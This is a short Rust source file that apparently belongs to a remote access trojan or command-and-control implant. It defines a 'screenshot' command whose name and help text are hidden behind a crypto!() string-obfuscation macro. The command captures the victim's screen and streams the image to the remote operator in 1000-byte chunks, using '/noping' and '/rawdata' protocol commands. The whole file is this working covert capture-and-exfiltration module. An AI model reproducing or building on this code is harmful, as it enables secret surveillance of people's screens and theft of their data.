use super::prelude::*;
use crate::utils;
use std::cmp::min;

pub struct Screenshot;

#[async_trait]
impl Command for Screenshot {
    fn name(&self) -> String {
        crypto!("screenshot")
    }

    fn help(&self) -> String {
        crypto!("take a screenshot")
    }

    fn min_args(&self) -> usize {
        0
    }

    async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
        let buffer = utils::screenshot_buffer()?;

        client.send_command("/noping")?;

        client.send(ok(format!("{}", buffer.len().to_string())))?;

        if String::from(client.receive()?) == "OK" {
            client.send_command(format!("/rawdata {}", buffer.len()))?;

            let packetsize = 1000;
            for i in (0..buffer.len()).step_by(packetsize) {
                client.rawdata_send(&buffer[i..i + min(packetsize, buffer.len() - i)])?;
            }

            client.receive()?;
        }

        client.send_command("/noping")?;

        Ok(())
    }
}
